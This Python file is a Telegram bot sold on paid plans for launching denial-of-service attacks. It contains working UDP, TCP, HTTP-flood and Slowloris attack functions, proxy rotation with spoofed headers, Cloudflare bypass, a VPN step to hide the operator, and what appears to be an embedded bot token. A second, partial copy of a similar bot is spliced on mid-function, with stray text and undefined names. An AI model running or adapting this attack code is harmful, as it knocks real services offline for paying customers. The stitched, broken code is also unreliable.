#!/usr/bin/env python3
"""
ADIL_X_BOT - Ultimate DDoS Bot with Random Attack Finished Videos
Author: Adil
Features: UDP/TCP/Layer7 attacks, progress bar, random video after attack
"""

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import time
import socket
import random
import requests
import os
import sys
import json
import sqlite3
import logging
import subprocess
import glob
from datetime import datetime, timedelta
from random import _urandom as byt
import cloudscraper

# ===================== ðŸ”§ CONFIGURATION =====================
API_TOKEN = '8762654526:AAFvVEJsFhVJeCCSmlSI6dxLVDNtbe41sTQ'           # @BotFather se token
ADMIN_ID = '6088159228'        # @userinfobot se ID
MAX_ATTACK_TIME = 900                       # Max 900 seconds
DEFAULT_THREADS = 500                       # Threads per attack
VPN_CONFIG_PATH = "/path/to/vpn/config.ovpn" # Optional VPN
VIDEO_FOLDER = "videos"                     # Folder containing attack finish videos
# ============================================================

# Setup logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(API_TOKEN)

# Global variables
attack_active = False
active_attacks = {}
proxies = []
user_agents = []
cooldown = {}

# Database setup
conn = sqlite3.connect('adil_bot.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, expiry INTEGER, max_duration INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, duration INTEGER, used_by TEXT)''')
conn.commit()

# ===================== HELPER FUNCTIONS =====================
def load_proxies():
    global proxies
    try:
        urls = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
        ]
        all_proxies = set()
        for url in urls:
            resp = requests.get(url, timeout=10)
            for line in resp.text.splitlines():
                line = line.strip()
                if line and ':' in line:
                    all_proxies.add(line)
        proxies = list(all_proxies)
        logger.info(f"Loaded {len(proxies)} proxies")
        return True
    except Exception as e:
        logger.error(f"Proxy load failed: {e}")
        proxies = []
        return False

def load_useragents():
    global user_agents
    try:
        with open("useragent.txt", "r") as f:
            user_agents = [line.strip() for line in f if line.strip()]
    except:
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/537.36"
        ]
    return user_agents

def check_user(user_id):
    c.execute("SELECT expiry, max_duration FROM users WHERE user_id=?", (str(user_id),))
    row = c.fetchone()
    if row:
        expiry, max_dur = row
        if expiry > int(time.time()):
            return True, max_dur
    return False, 0

def generate_key(duration=30):
    import string
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    expiry_time = int(time.time()) + (duration * 86400)
    c.execute("INSERT INTO keys (key, duration, used_by) VALUES (?, ?, ?)", (key, expiry_time, None))
    conn.commit()
    return key

def redeem_key(user_id, key):
    c.execute("SELECT duration, used_by FROM keys WHERE key=?", (key,))
    row = c.fetchone()
    if row and row[1] is None:
        expiry = row[0]
        c.execute("INSERT OR REPLACE INTO users (user_id, expiry, max_duration) VALUES (?, ?, ?)", (str(user_id), expiry, MAX_ATTACK_TIME))
        c.execute("UPDATE keys SET used_by=? WHERE key=?", (str(user_id), key))
        conn.commit()
        return True
    return False

# ===================== VPN AUTO-CONNECT (Optional) =====================
def connect_vpn():
    if not os.path.exists(VPN_CONFIG_PATH):
        return False
    try:
        subprocess.run(["sudo", "pkill", "openvpn"], stderr=subprocess.DEVNULL)
        time.sleep(1)
        subprocess.Popen(["sudo", "openvpn", "--config", VPN_CONFIG_PATH, "--daemon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)
        result = subprocess.run(["ip", "addr", "show", "tun0"], capture_output=True)
        return result.returncode == 0
    except:
        return False

def is_vpn_active():
    try:
        result = subprocess.run(["ip", "addr", "show", "tun0"], capture_output=True)
        return result.returncode == 0
    except:
        return False

# ===================== ATTACK FUNCTIONS =====================
def udp_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = byt.randint(0, 1024)
    end_time = time.time() + duration
    while time.time() < end_time and attack_active:
        try:
            sock.sendto(payload, (target_ip, int(target_port)))
        except:
            pass
    sock.close()

def tcp_syn_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    while time.time() < end_time and attack_active:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, int(target_port)))
            s.send(b"SYN")
            s.close()
        except:
            pass

def http_flood(target_ip, target_port, duration, method="GET"):
    end_time = time.time() + duration
    scraper = cloudscraper.create_scraper()
    while time.time() < end_time and attack_active:
        try:
            proxy = random.choice(proxies) if proxies else None
            proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
            headers = {"User-Agent": random.choice(user_agents), "Accept": "*/*"}
            fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}"
            headers["X-Forwarded-For"] = fake_ip
            url = f"http://{target_ip}:{target_port}/"
            if method == "GET":
                requests.get(url, headers=headers, proxies=proxy_dict, timeout=2)
            elif method == "POST":
                requests.post(url, headers=headers, proxies=proxy_dict, timeout=2)
            elif method == "HEAD":
                requests.head(url, headers=headers, proxies=proxy_dict, timeout=2)
            elif method == "SKY":
                scraper.get(url, headers=headers, timeout=2)
        except:
            pass

def slowloris(target_ip, target_port, duration):
    sockets_list = []
    end_time = time.time() + duration
    for _ in range(200):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, int(target_port)))
            s.send(f"GET /{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target_ip}\r\n".encode())
            sockets_list.append(s)
        except:
            pass
    while time.time() < end_time and attack_active:
        for s in sockets_list[:]:
            try:
                s.send(f"X-Header: {random.randint(1,5000)}\r\n".encode())
            except:
                sockets_list.remove(s)
        time.sleep(5)

# ===================== RANDOM VIDEO PICKER =====================
def get_random_video():
    """Pick a random video file from VIDEO_FOLDER directory"""
    if not os.path.exists(VIDEO_FOLDER):
        os.makedirs(VIDEO_FOLDER)
        logger.warning(f"Folder '{VIDEO_FOLDER}' created. Please add some .mp4 files.")
        return None
    video_files = glob.glob(os.path.join(VIDEO_FOLDER, "*.mp4")) + glob.glob(os.path.join(VIDEO_FOLDER, "*.MP4"))
    if not video_files:
        logger.warning("No video files found in 'videos' folder.")
        return None
    return random.choice(video_files)

def send_random_video(chat_id, caption):
    """Send a random video to the chat"""
    video_path = get_random_video()
    if video_path and os.path.exists(video_path):
        try:
            with open(video_path, 'rb') as vid:
                bot.send_video(chat_id, vid, caption=caption, timeout=30)
            return True
        except Exception as e:
            logger.error(f"Failed to send video: {e}")
    # Fallback: send a text message if no video
    bot.send_message(chat_id, caption + "\n\nðŸŽ¬ Video not available, but attack completed!")
    return False

# ===================== ATTACK STARTER WITH PROGRESS =====================
def start_attack(chat_id, target_ip, target_port, duration, attack_type, threads=DEFAULT_THREADS):
    global attack_active
    if attack_active:
        bot.send_message(chat_id, "âš ï¸ An attack is already running! Use /stop first.")
        return
    if duration > MAX_ATTACK_TIME:
        bot.send_message(chat_id, f"âŒ Max attack time is {MAX_ATTACK_TIME} seconds!")
        return
    # Check user plan
    valid, max_dur = check_user(str(chat_id))
    if str(chat_id) != ADMIN_ID and not valid:
        bot.send_message(chat_id, "âŒ No active plan! Use /redeem <KEY> to activate.")
        return
    if duration > max_dur and str(chat_id) != ADMIN_ID:
        bot.send_message(chat_id, f"âš ï¸ Your plan allows max {max_dur}s attack.")
        return
    # Optional VPN auto-connect
    if not is_vpn_active() and os.path.exists(VPN_CONFIG_PATH):
        bot.send_message(chat_id, "ðŸŒ Connecting VPN...")
        connect_vpn()
    
    attack_active = True
    start_time = datetime.now()
    # Initial message with formatting like AURIX bot
    progress_msg = bot.send_message(chat_id, 
        f"ðŸ”¥ **Attack Started!** ðŸ”¥\n`{target_ip}:{target_port}`\nDuration: `{duration}s`\nMethod: {attack_type}\nUser: {chat_id}\nMonitor: Type /status to see live progress\n\n`0%`", parse_mode='Markdown')
    
    # Launch threads
    threads_list = []
    for _ in range(threads):
        if attack_type == "UDP":
            t = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
        elif attack_type == "TCP":
            t = threading.Thread(target=tcp_syn_flood, args=(target_ip, target_port, duration))
        elif attack_type in ["GET", "POST", "HEAD", "SKY"]:
            t = threading.Thread(target=http_flood, args=(target_ip, target_port, duration, attack_type))
        elif attack_type == "SLOWLORIS":
            t = threading.Thread(target=slowloris, args=(target_ip, target_port, duration))
        else:
            t = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
        t.daemon = True
        t.start()
        threads_list.append(t)
    
    # Progress update loop
    while time.time() < start_time.timestamp() + duration and attack_active:
        elapsed = int(time.time() - start_time.timestamp())
        percent = min(100, int((elapsed / duration) * 100))
        remaining = duration - elapsed
        progress_bar = "â–ˆ" * (percent // 10) + "â–‘" * (10 - (percent // 10))
        # Format like screenshot: shows timer
        bot.edit_message_text(
            f"ðŸ”¥ **Attack in Progress** ðŸ”¥\n`{target_ip}:{target_port}`\nDuration: `{duration}s`\nMethod: {attack_type}\n\n`[{progress_bar}]` {percent}%\nRemaining: `{remaining}s`\nðŸŒ€ Status: FLOODING...â³",
            chat_id=chat_id, message_id=progress_msg.message_id, parse_mode='Markdown'
        )
        time.sleep(5)
    
    attack_active = False
    
    # Send final completion message
    final_caption = f"âœ… **Attack Finished!** âœ…\n`{target_ip}:{target_port}`\nDuration: `{duration}s`\nMethod: {attack_type}\n\nðŸŽ¯ Operation completed successfully!"
    bot.edit_message_text(
        final_caption,
        chat_id=chat_id, message_id=progress_msg.message_id, parse_mode='Markdown'
    )
    
    # Send random video from folder
    send_random_video(chat_id, final_caption)

# ===================== TELEGRAM COMMANDS =====================
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    welcome_msg = f"ðŸ‘‹ *Welcome {message.from_user.first_name}!*\n\n" \
                  f"ðŸ”¥ *ADIL_X_BOT* - Ultimate DDoS Bot ðŸ”¥\n" \
                  f"ðŸ“¡ *Status:* Active\n" \
                  f"ðŸ›¡ï¸ *Methods:* UDP, TCP, GET, POST, HEAD, SKY, SLOWLORIS\n" \
                  f"âš¡ *Max Attack:* {MAX_ATTACK_TIME}s\n\n" \
                  f"*Commands:*\n" \
                  f"`/attack <IP> <PORT> <TIME>` - Start UDP attack\n" \
                  f"`/method <METHOD> <IP> <PORT> <TIME>` - Specific attack\n" \
                  f"`/status` - Attack status\n" \
                  f"`/stop` - Stop attack\n" \
                  f"`/redeem <KEY>` - Activate plan\n" \
                  f"`/plan` - Available plans\n" \
                  f"`/admin` - Admin panel (admin only)"
    bot.reply_to(message, welcome_msg, parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "âŒ *Usage:* `/attack <IP> <PORT> <TIME>`\nExample: `/attack 192.168.1.1 80 60`", parse_mode='Markdown')
        return
    ip, port, duration = args[1], int(args[2]), int(args[3])
    threading.Thread(target=start_attack, args=(message.chat.id, ip, port, duration, "UDP")).start()

@bot.message_handler(commands=['method'])
def method_cmd(message):
    args = message.text.split()
    if len(args) != 5:
        bot.reply_to(message, "âŒ *Usage:* `/method <TYPE> <IP> <PORT> <TIME>`\nTypes: UDP, TCP, GET, POST, HEAD, SKY, SLOWLORIS", parse_mode='Markdown')
        return
    method, ip, port, duration = args[1].upper(), args[2], int(args[3]), int(args[4])
    if method not in ["UDP", "TCP", "GET", "POST", "HEAD", "SKY", "SLOWLORIS"]:
        bot.reply_to(message, "âŒ Invalid method!")
        return
    threading.Thread(target=start_attack, args=(message.chat.id, ip, port, duration, method)).start()

@bot.message_handler(commands=['status'])
def status_cmd(message):
    status_msg = f"ðŸŸ¢ *Bot Status:* Active\nðŸ“¡ *Attack Running:* `{attack_active}`\nðŸ‘¥ *Total Users:* `{get_user_count()}`\nâš™ï¸ *Admin:* `{ADMIN_ID}`"
    bot.reply_to(message, status_msg, parse_mode='Markdown')

def get_user_count():
    c.execute("SELECT COUNT(*) FROM users")
    return c.fetchone()[0]

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global attack_active
    attack_active = False
    bot.reply_to(message, "ðŸ›‘ *Attack Stopped!* Bot ready for new commands.", parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def redeem_cmd(message):
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "âŒ *Usage:* `/redeem <KEY>`", parse_mode='Markdown')
        return
    key = args[1]
    if redeem_key(message.chat.id, key):
        bot.reply_to(message, f"âœ… *Key `{key}` Redeemed!* You now have full access.", parse_mode='Markdown')
    else:
        bot.reply_to(message, "âŒ *Invalid Key!* Contact @Admin.", parse_mode='Markdown')

@bot.message_handler(commands=['plan'])
def plan_cmd(message):
    plans = "ðŸ“‹ *AVAILABLE PLANS* ðŸ“‹\n\n" \
            "ðŸ¥‰ *Basic Plan* - 30 days, 60s max - $10\n" \
            "ðŸ¥ˆ *Pro Plan* - 90 days, 300s max - $25\n" \
            "ðŸ¥‡ *Ultimate Plan* - 365 days, 900s max - $50\n\n" \
            "Contact @Admin to purchase!"
    bot.reply_to(message, plans, parse_mode='Markdown')

# ===================== ADMIN COMMANDS =====================
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if str(message.chat.id) != ADMIN_ID:
        bot.reply_to(message, "â›” Unauthorized!")
        return
    admin_msg = "âš™ï¸ *Admin Panel*\n\n/adduser <id> <days>\n/removeuser <id>\n/genkey <days>\n/set_time <sec>\n/set_threads <num>\n/allusers\n/broadcast <msg>"
    bot.reply_to(message, admin_msg, parse_mode='Markdown')

@bot.message_handler(commands=['adduser'])
def add_user(message):
    if str(message.chat.id) != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "Usage: /adduser <user_id> <days>")
        return
    user_id, days = args[1], int(args[2])
    expiry = int(time.time()) + days * 86400
    c.execute("INSERT OR REPLACE INTO users (user_id, expiry, max_duration) VALUES (?, ?, ?)", (user_id, expiry, MAX_ATTACK_TIME))
    conn.commit()
    bot.reply_to(message, f"âœ… Added {user_id} for {days} days.")

@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    if str(message.chat.id) != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /removeuser <user_id>")
        return
    c.execute("DELETE FROM users WHERE user_id=?", (args[1],))
    conn.commit()
    bot.reply_to(message, "âœ… User removed.")

@bot.message_handler(commands=['genkey'])
def gen_key(message):
    if str(message.chat.id) != ADMIN_ID: return
    args = message.text.split()
    days = int(args[1]) if len(args) > 1 else 30
    key = generate_key(days)
    bot.reply_to(message, f"ðŸ”‘ New Key: `{key}`\nDuration: {days} days", parse_mode='Markdown')

@bot.message_handler(commands=['set_time'])
def set_time(message):
    if str(message.chat.id) != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /set_time <seconds>")
        return
    global MAX_ATTACK_TIME
    MAX_ATTACK_TIME = int(args[1])
    bot.reply_to(message, f"âœ… Max time set to {MAX_ATTACK_TIME}s")

@bot.message_handler(commands=['set_threads'])
def set_threads(message):
    if str(message.chat.id) != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /set_threads <count>")
        return
    global DEFAULT_THREADS
    DEFAULT_THREADS = int(args[1])
    bot.reply_to(message, f"âœ… Threads set to {DEFAULT_THREADS}")

@bot.message_handler(commands=['allusers'])
def list_users(message):
    if str(message.chat.id) != ADMIN_ID: return
    c.execute("SELECT user_id FROM users")
    users = [row[0] for row in c.fetchall()]
    if users:
        bot.reply_to(message, "ðŸ“‹ Users:\n" + "\n".join(users))
    else:
        bot.reply_to(message, "No users.")

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if str(message.chat.id) != ADMIN_ID: return
    msg = message.text[len('/broadcast'):].strip()
    if not msg:
        bot.reply_to(message, "Usage: /broadcast <message>")
        return
    c.execute("SELECT user_id FROM users")
    count = 0
    for (user_id,) in c.fetchall():
        try:
            bot.send_message(user_id, f"ðŸ“¢ Admin Broadcast:\n{msg}")
            count += 1
        except:
            pass
    bot.reply_to(message, f"âœ… Broadcast sent to {count} users.")

# ===================== START BOT =====================
if __name__ == "__main__":
    print(f"ðŸ¤– ADIL_X_BOT started! Admin: {ADMIN_ID}")
    load_proxies()
    load_useragents()
    # Ensure videos folder exists
    if not os.path.exists(VIDEO_FOLDER):
        os.makedirs(VIDEO_FOLDER)
        print(f"ðŸ“ Created folder '{VIDEO_FOLDER}'. Please put your attack finish videos (.mp4) inside.")
    print(f"ðŸŽ¬ Random video will be sent after each attack from '{VIDEO_FOLDER}'")
    bot.infinity_polling()        return

    attack_active = True
    bot.send_message(chat_id, f"🔥🔥🔥 **UDP FLOOD STARTED** 🔥🔥🔥\n*Target:* `{target_ip}:{target_port}`\n*Duration:* `{duration}`s\n*Threads:* `{THREAD_COUNT}`", parse_mode='Markdown')
    if get_random_proxy():
        bot.send_message(chat_id, "🛡️ **NASA-LEVEL PROXY ENABLED** - Attack is ANONYMOUS!")
    for _ in range(THREAD_COUNT):
        if not attack_active: break
        threading.Thread(target=udp_worker, args=(target_ip, target_port, duration), daemon=True).start()
    time.sleep(duration)
    attack_active = False
    bot.send_message(chat_id, "✅ **Attack Finished!** Target might be down.")
    os._exit(0)

# ===================== INLINE KEYBOARD & COMMANDS =====================
def main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🎯 Attack Menu", callback_data='attack'),
        InlineKeyboardButton("🔍 Status", callback_data='status'),
        InlineKeyboardButton("⚙️ Admin Panel", callback_data='admin'),
        InlineKeyboardButton("❓ Help", callback_data='help')
    )
    return keyboard

def attack_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("💣 UDP Flood", callback_data='udp_attack'),
        InlineKeyboardButton("🌪️ Layer7 (HTTP)", callback_data='layer7'),
        InlineKeyboardButton("🧵 Change Threads", callback_data='thread'),
        InlineKeyboardButton("🔙 Main Menu", callback_data='main')
    )
    return keyboard

def admin_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("👑 Change Admin", callback_data='change_admin'),
        InlineKeyboardButton("🕒 Set Max Time", callback_data='set_time'),
        InlineKeyboardButton("🧵 Set Thread Count", callback_data='set_thread'),
        InlineKeyboardButton("🔙 Main Menu", callback_data='main')
    )
    return keyboard

@bot.message_handler(commands=['start', 'help'])
def welcome(message):
    bot.send_message(message.chat.id, f"🔥🔥🔥 **ADIL_BOT - DDoS MASTER** 🔥🔥🔥\n\nI am a powerful DDoS bot with advanced UDP flood capabilities!\n\n*Admin Commands:*\n/attack `ip` `port` `time`\n/status\n/stop\n/admin - Change admin\n/set_time\n/set_thread\n\n💥 **Developed by @Adil**💥", parse_mode='Markdown', reply_markup=main_keyboard())

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "❌ Usage: /attack <IP> <PORT> <TIME>\nExample: /attack 192.168.1.1 80 60")
        return
    _, ip, port, time = parts
    threading.Thread(target=start_udp_attack, args=(message.chat.id, ip, port, int(time))).start()

@bot.message_handler(commands=['status'])
def status(message):
    bot.reply_to(message, f"🟢 **Bot Status:** \n- Attack Running: {attack_active}", parse_mode='Markdown', reply_markup=main_keyboard())

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    global attack_active
    if attack_active:
        attack_active = False
        bot.reply_to(message, "🛑 Attack stopped by admin!")
    else:
        bot.reply_to(message, "No attack running.")

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if str(message.chat.id) != ADMIN_ID:
        bot.reply_to(message, "⛔ Unauthorized access!")
        return
    bot.reply_to(message, "⚙️ **Admin Control Panel**", parse_mode='Markdown', reply_markup=admin_keyboard())

@bot.message_handler(commands=['set_time'])
def set_time(message):
    global MAX_ATTACK_TIME
    if str(message.chat.id) != ADMIN_ID: return
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        bot.reply_to(message, "Invalid time! Use: /set_time 900")
        return
    MAX_ATTACK_TIME = min(900, int(parts[1]))
    bot.reply_to(message, f"✅ Max attack time set to {MAX_ATTACK_TIME}s")
    attack_keyboard() - yes

@bot.message_handler(commands=['set_thread'])
def set_threads(message):
    global THREAD_COUNT
    if str(message.chat.id) != ADMIN_ID: return
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        bot.reply_to(message, "Invalid count! Use: /set_thread 500")
        return
    THREAD_COUNT = int(parts[1])
    bot.reply_to(message, f"✅ Thread count set to {THREAD_COUNT}")

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    if call.data == 'attack':
        bot.edit_message_text("🔥 Select Attack Type:", call.message.chat.id, call.message.message_id, reply_markup=attack_keyboard())
    elif call.data == 'udp_attack':
        bot.edit_message_text("🎯 Send target in format:\n/attack <IP> <PORT> <TIME>", call.message.chat.id, call.message.message_id)
    elif call.data == 'main':
        bot.edit_message_text("🏠 Main Menu:", call.message.chat.id, call.message.message_id, reply_markup=main_keyboard())
    elif call.data == 'status':
        bot.edit_message_text(f"🟢 Bot Active\nAttack Running: {attack_active}", call.message.chat.id, call.message.message_id, reply_markup=main_keyboard())
    elif call.data == 'admin':
        if str(call.message.chat.id) == ADMIN_ID:
            bot.edit_message_text("⚙️ Admin Panel:", call.message.chat.id, call.message.message_id, reply_markup=admin_keyboard())
        else:
            bot.edit_message_text("⛔ Unauthorized!", call.message.chat.id, call.message.message_id)
    elif call.data == 'help':
        help_text = "🔥 Commands:\n/attack ip port time\n/status\n/stop\n/admin - Admin panel\n/set_time\n/set_thread"
        bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, reply_markup=main_keyboard())

# ------------------- LOAD PROXIES -------------------
load_proxies()

if __name__ == "__main__":
    print("🔥 ADIL_BOT STARTED SUCCESSFULLY!")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"🧵 Threads: {THREAD_COUNT}")
    print(f"🛡️ Max Attack Time: {MAX_ATTACK_TIME}s")
    bot.infinity_polling()
